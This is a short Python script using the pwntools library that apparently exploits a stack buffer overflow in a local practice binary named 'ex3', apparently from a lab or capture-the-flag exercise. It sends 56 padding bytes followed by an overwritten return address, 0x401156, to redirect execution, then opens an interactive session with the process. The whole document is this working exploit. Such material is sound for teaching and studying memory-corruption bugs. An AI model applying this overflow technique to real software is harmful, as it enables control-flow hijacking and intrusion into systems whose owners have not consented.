#!/usr/bin/env python3

from pwn import *

target = process("./bin/ex3")

payload = b"A" * 56 + p64(0x401156)

target.send(payload)

target.interactive()
